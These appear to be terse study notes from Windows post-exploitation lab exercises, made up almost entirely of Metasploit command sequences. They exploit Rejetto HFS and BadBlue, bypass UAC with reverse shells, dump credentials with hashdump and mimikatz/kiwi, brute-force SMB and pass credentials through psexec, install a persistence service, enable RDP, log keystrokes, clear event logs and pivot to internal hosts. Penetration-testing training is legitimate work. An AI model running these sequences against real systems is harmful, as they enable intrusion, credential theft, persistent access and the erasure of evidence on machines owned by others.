we can utilize these post exploiation modules to enumerate information about the windows system we currently have access to 
- enumerate user privlieges
- enumerate logged on users
- VM check
- enumerate installed programs
- enumerate AVs
- enumerate computers connected to domain
- enumerate installed patches
- enumerate shares


# Windows Post exploitation modules

	msfconsole
	use exploit/windows/http/rejetto_hfs_exec
	set RHOSTS ip
	exploit
	background
	use post/windows/gather/win_privs
	set SESSION 1
	exploit
	use post/windows/gather/enum_logged_on_users
	set SESSION 1
	exploit
	use post/windows/gather/checkvm
	set SESSION 1
	exploit
	use post/windows/gather/enum_applications
	set SESSION 1
	exploit
	use post/windows/gather/enum_av_excluded
	set SESSION 1
	exploit
	use post/windows/gather/enum_computers
	set SESSION 1 
	exploit
	use post/windows/gather/enum_shares
	set SESSION 1
	exploit


# Windows Privilege Escalation Bypassing UAC memory injection

	nmap ip
	nmap -sV -p80 ip 
	searchsploit hfs
	msfconsole
	use exploit/windows/http/rejetto_hfs_exec
	set RHOSTS ip
	exploit
	getuid
	sysinfo
	ps -S explorer.exe
	migrate 2440
	getsystem
	shell
	net localgroup administrators
	CTRL + C
	background
	use exploit/windows/local/bypassuac_injection
	set session 1
	set TARGET 1
	set PAYLOAD windows/x64/meterpreter/reverse_tcp
	exploit
	getsystem
	getuid
	ps -S lsass.exe
	migrate (PID number)
	hashdump


# Windows Privilege Escalation: Token Impersonation with incognito
#### Privilege Escalation: Impersonate

	nmap ip
	nmap -sV -p 80 ip
	searchsploit hfs
	msfconsole 
	setg RHOSTS ip
	use exploit/windows/http/rejetto_hfs_exec
	exploit
	getuid
	cat C:\\Users\\Administrator\\Desktop\\flag.txt (access denied)
	load incognito
	list_tokens -u
	impersonate_token ATTACKDEFENSE\\Administrator
	getuid
	cat C:\\Users\\Administrator\\Desktop\\flag.txt (Solved)


## Dumping Hashed with mimikatz (meterpreter Kiwi Extension)

	nmap ip
	nmap -sV -p 80 ip
	searchsploit badblue 2.7
	msfconsole
	use exploit/windows/http/badblue_passthru
	set RHOSTS ip
	exploit
	migrate -N lsass.exe
	load kiwi
	creds_all
	lsa_dump_sam
	lsa_dump_secrets


## pass the hash with PSEXEC (exploiting SMB with psexec

	nmap ip
	nmap -p445 --script smb-protocols ip
	use auxiliary/scanner/smb/smb_login
	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	set VERBOSE false
	exploit 
	back
	use exploit/windows/smb/psexec
	set RHOSTS ip
	set SMBUser administrator
	set SMBPass qwertyuiop
	exploit
	shell
	cd /
	dir
	type flag.txt


## Maintaining Access (Persistence Service)

	nmap ip
	nmap -sV -p80 ip
	searchsploit hfs
	msfconsole
	use exploit/windows/http/rejetto_hfs_exec
	set RHOSTS ip
	set LHOST ip
	exploit
	getuid
	background
	use exploit/windows/local/persistence_service
	set SESSION 1
	exploit
	start another msfconsole and run multi handler to regain access
	msfconsole 
	use exploit/multi/handler
	set LHOST ip
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LPORT 4444
	exploit
	session -i 1 (in the persistence service meterpreter)
	getuid (in the multi handler meterpreter)
	reboot




## Enabling RDP (remote desktop protocol)

	nmap ip
	nmap -sV -p 80 ip
	searchsploit badblue 2.7
	msfconsole
	use exploit/windows/http/badblue_passthru
	set RHOSTS ip
	exploit
	CTRL + Z
	use post/windows/manage/enable_rdp
	set SESSION 1
	exploit
	sessions -i 1
	shell
	net user administrator hacker_123321
	xfreerdp /u:administrator /p:hacker_123321 /v:ip
	(Y)
	locate  the flag


#### Windows: File and Keylogging

	nmap ip
	nmap -sV -p 80 ip
	searchsploit badblue 2.7
	msfconsole
	use exploit/windows/http/badblue_passthru
	set RHOSTS ip
	exploit
	shell
	cd /
	dir
	type flag.txt
	cd Users\\Administrators\\Desktop
	dir
	ECHO "You have been hacked " > hacked.txt
	ps
	migrate explorer.exe PID number
	keyscan_start
	keyscan_dump
	type random texts in the notepad
	keyscan_dump
	


## Clearing Windows Event Logs

	msfconsole
	use exploit/windows/http/badblue_passthru
	set RHOSTS ip
	exploit
	clearev


## Pivoting
is a post exploitation techniques that involves utilizing a compromised host to attack other systems on the compromised host's private internal network

- after gaining access to one host we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously

## Pivoting lab

	nmap ip
	nmap -sV -p80 ip
	searchsploit hfs
	msfconsole
	use exploit/windows/http/rejetto_hfs_exec
	set RHOSTS ip
	exploit
	ipconfig
	run autoroute -s ip
	background
	use auxiliary/scanner/portscan/tcp
	set RHOSTS ip
	set PORTS 1-100
	exploit
	sessions -i 1
	portfwd add -l 1234 -p 80 -r ip
	portfwd list
	nmap -sV -sS -p 1234 localhost
	searchsploit badblue 2.7
	use exploit/windows/http/badblue_passthru
	set PAYLOAD windows/meterpreter/bind_tcp
	set RHOSTS ip
	exploit
	shell
	cd /
	dir
	type flag.txt
	